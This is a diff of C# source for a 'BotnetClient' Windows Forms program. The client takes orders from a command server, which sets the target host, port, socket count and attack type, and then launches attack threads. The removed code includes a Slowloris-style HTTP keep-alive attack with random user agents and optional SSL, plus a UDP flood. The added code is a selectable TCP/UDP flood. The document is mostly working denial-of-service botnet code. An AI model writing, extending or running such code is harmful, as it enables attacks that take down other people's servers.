@@ -25,14 +25,14 @@ namespace BotnetClient
         List<AttackConnection> attackConnections = new List<AttackConnection>();
         // Host Server Settings
         //string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
-        string serverIPV4 = "10.35.24.225"; // IPV4 of host server (for lan)
+        string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
         Int32 serverPort = 11111; // Server Port
         // Attack Settings
         static string HostOrIP = "localhost"; // Victim's IP or hostname
         static int Port = 80; // Victim's port
-        static bool UseSsl = false; // Will we use SSL when attacking?
-        static bool restart = false; // If this gets set to true, the client will restart
-        static int Delay = 15000; // Delay between keep alive data
+        static string type = "TCP"; // What attack type (TCP, UDP, etc...)
+        static bool restart = false; // If this gets set to true, the client will restart & reconnect
+        static int Delay = 15000; // Delay
         static int SockCount = 8; // How many connections to make?
         Boolean attacking = false; // Are we currently attacking?
         // Other Variables
@@ -74,8 +74,7 @@ namespace BotnetClient
         {
             InitializeComponent();
             log("Starting client thread...");
-            this.StyleManager = metroStyleManager1;
-            connectionLogListView.Columns[0].Width = connectionLogListView.Width;
+            logListView.Columns[0].Width = logListView.Width;
             clientThread = new Thread(() => clientSocketThread());
             clientThread.Start();
         }
@@ -166,9 +165,10 @@ namespace BotnetClient
                                             {
                                                 SockCount = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                             }
-                                            else if (item.Contains("UseSSL:"))
+                                            else if (item.Contains("Type:"))
                                             {
-                                                UseSsl = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
+                                                type = item.Substring(item.IndexOf(":") + 1).Trim();
+
                                             }
                                             else if (item.Contains("Attack:"))
                                             {
@@ -277,11 +277,11 @@ namespace BotnetClient
                     ListViewItem newItem = new ListViewItem();
                     newItem.Text = logMessage;
                     // Use Invoke() to access the log listview from other threads (very big brain)
-                    connectionLogListView.Invoke((MethodInvoker)delegate {
+                    logListView.Invoke((MethodInvoker)delegate {
                         // Running on the UI thread
-                        connectionLogListView.Items.Add(newItem);
-                        connectionLogListView.Columns[0].Width = connectionLogListView.Width - 5;
-                        connectionLogListView.EnsureVisible(connectionLogListView.Items.Count - 1);
+                        logListView.Items.Add(newItem);
+                        logListView.Columns[0].Width = logListView.Width - 5;
+                        logListView.EnsureVisible(logListView.Items.Count - 1);
                     });
                     previousLogMessage = raw;
                 }
@@ -295,7 +295,7 @@ namespace BotnetClient
                     File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                 } catch (Exception e)
                 {
-                    Console.WriteLine(e.ToString());
+                    //Problem writing to log file... this happens with a bunch of threads/sockets attacking (will need fixing)
                 }
             }
         }
@@ -322,137 +322,101 @@ namespace BotnetClient
             catch (Exception er) { }
         }
 
-
-
         /// <summary>
-        /// UDP attack method
+        /// Version 2 of the attack method. allows for TCP/UDP specification
         /// </summary>
         /// <param name="connection"></param>
         private void attackV2(AttackConnection connection)
         {
-            // Create and setup socket for this attack thread
-            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-            IPAddress serverAddr = IPAddress.Parse(HostOrIP.Trim());
-            IPEndPoint endPoint = new IPEndPoint(serverAddr, Port);
-            connection.attackSocket = sock;
-
-            // Send first message
-            try
-            {
-                string text = "Get shmacked slime!";
-                byte[] send_buffer = Encoding.ASCII.GetBytes(text);
-                sock.SendTo(send_buffer, endPoint);
-            } catch (Exception e)
-            {
-                log("Initial attack message not sent on thread " + connection.guid + "...");
-            }
-
             Boolean shouldAttack = attacking;
-            while (shouldAttack)
+            if (type == "TCP")
             {
-                shouldAttack = attacking;
                 try
                 {
-                    string text = Guid.NewGuid().ToString();
-                    byte[] send_buffer = Encoding.ASCII.GetBytes(text);
-                    log("[" + connection.guid + "] sending data: " + text);
-                    sock.SendTo(send_buffer, endPoint);
+                    TcpClient client = new TcpClient(HostOrIP.Trim(), Port);
+                    // Get a client stream for reading and writing.
+                    NetworkStream stream = client.GetStream();
+                    while (shouldAttack)
+                    {
+                        shouldAttack = attacking;
+                        string message = Guid.NewGuid().ToString();
+                        Byte[] data = Encoding.ASCII.GetBytes(message);
+                        try
+                        {
+                            log("[" + connection.guid + "] sending " + type + " data: " + message);
+                            stream.Write(data, 0, data.Length);
+                        }
+                        catch (Exception e)
+                        {
+                            log("Problem sending " + type + " packet on thread " + connection.guid + ". Closing thread...");
+                            stream.Close();
+                            client.Close();
+                            client.Dispose();
+                            shouldAttack = false;
+                        }
+                        Thread.Sleep(Delay);
+                    }
                 } catch (Exception e)
                 {
-                    log("Problem sending attack message on thread " + connection.guid + ". Closing thread...");
-                    connection.attackSocket.Shutdown(SocketShutdown.Both);
-                    connection.attackSocket.Close();
-                    connection.attackSocket.Dispose();
-                    shouldAttack = false;
+                    log("Error perfomring " + type + " attack... " + e.ToString());
                 }
-                Thread.Sleep(Delay);
+                 
+            } else if (type == "UDP")
+            {
+                UdpClient client = new UdpClient(HostOrIP.Trim(), Port);
+                while (shouldAttack)
+                {
+                    shouldAttack = attacking;
+                    string message = Guid.NewGuid().ToString();
+                    Byte[] sendBytes = Encoding.ASCII.GetBytes(message);
+                    try
+                    {
+                        log("[" + connection.guid + "] sending " + type + " data: " + message);
+                        client.Send(sendBytes, sendBytes.Length);
+                    }
+                    catch (Exception e)
+                    {
+                        log("Problem sending " + type + " packet on thread " + connection.guid + ". Closing thread...");
+                        client.Close();
+                        client.Dispose();
+                        shouldAttack = false;
+                    }
+                    Thread.Sleep(Delay);
+                }
+            } else
+            {
+                log("Attack type could not be determined... (type = '" + type + "'");
             }
             log("Attack thread " + connection.guid + " has finished running...");
         }
 
         /// <summary>
-        /// TCP attack method
+        /// Catcher for clicking list view
         /// </summary>
-        /// <param name="c"></param>
-        public void InitClient(TcpClient c)
-        { 
-            // GET request to random nonexistent location
-            byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n");
-            // Random user agent
-            byte[] UserAgent = Encoding.UTF8.GetBytes($"User-Agent: {UserAgents[Rand.Next(UserAgents.Length)]}"); 
-            byte[] AcceptLanguage = Encoding.UTF8.GetBytes("Accept-Language: en-US,en,q=0.5");
-            try
-            {
-                IPHostEntry hostInfo = Dns.Resolve(HostOrIP.Trim());
-                // Resolve hostname and connect
-                c.Connect(hostInfo.AddressList.Where(x => x.AddressFamily == AddressFamily.InterNetwork).First(), Port); 
-                if (UseSsl)
-                {
-                    SocketSafe(c, () =>
-                    {
-                        log($"Initiating socket ({c.Client.LocalEndPoint})");
-
-                        SslStream s = new SslStream(c.GetStream()); // Create SSL
-                        log($"Authenticating with SSL ({c.Client.LocalEndPoint})");
-                        s.AuthenticateAsClient(HostOrIP); // Authenticate
-                        s.Write(GET, 0, GET.Length);
-                        s.Write(UserAgent, 0, UserAgent.Length);
-                        s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
-                        new Thread(x =>
-                        {
-                            SocketSafe(c, () =>
-                            {
-                                while (attacking)
-                                {
-                                    log($"Sending keep alive data... ({c.Client.LocalEndPoint})");
-                                    byte[] XA = Encoding.UTF8.GetBytes($"X-a: {Rand.Next(5000)}");
-                                    s.Write(XA, 0, XA.Length); // Send keep alive data to keep the connection open
-                                    Thread.Sleep(Delay); // Wait
-                                }
-                                log("Attack Stopped");
-                            });
-                        }).Start();
-                    });
-                }
-                else
-                {
-                    SocketSafe(c, () =>
-                    {
-
-                        log($"Initiating socket ({c.Client.LocalEndPoint})");
-                        NetworkStream s = c.GetStream();
-                        s.Write(GET, 0, GET.Length);
-                        s.Write(UserAgent, 0, UserAgent.Length);
-                        s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
-                        new Thread(x =>
-                        {
-                            SocketSafe(c, () =>
-                            {
-                                while (attacking)
-                                {
-                                    log($"Sending keep alive data... ({c.Client.LocalEndPoint})");
-                                    byte[] XA = Encoding.UTF8.GetBytes($"X-a: {Rand.Next(5000)}");
-                                    s.Write(XA, 0, XA.Length); // Send keep alive data to keep the connection open
-                                    Thread.Sleep(Delay); // Wait
-                                }
-                                log("Attack Stopped");
-                            });
-                        }).Start();
-                    });
-                }
-            }
-            catch (Exception e) { log($"Error connecting:\r\n{e}"); }
-        }
-        public void SocketSafe(TcpClient c, Action a)
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void connectionLogListView_MouseDown(object sender, MouseEventArgs e)
         {
-            try
+            if (e.Button == MouseButtons.Right)
             {
-                a();
+                var focusedItem = logListView.FocusedItem;
+                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
+                {
+                    logContextMenu.Show(Cursor.Position);
+                }
             }
-            catch (Exception e)
+        }
+
+        /// <summary>
+        /// Catcher for clicking 'view message' on a log item
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void viewMessageToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (logListView.SelectedItems[0] != null)
             {
-                log($"Something went wrong, recreating socket:\r\n{e}");
-                InitClient(c);
+                MessageBox.Show(logListView.SelectedItems[0].Text, "Log Message");
             }
         }
     }
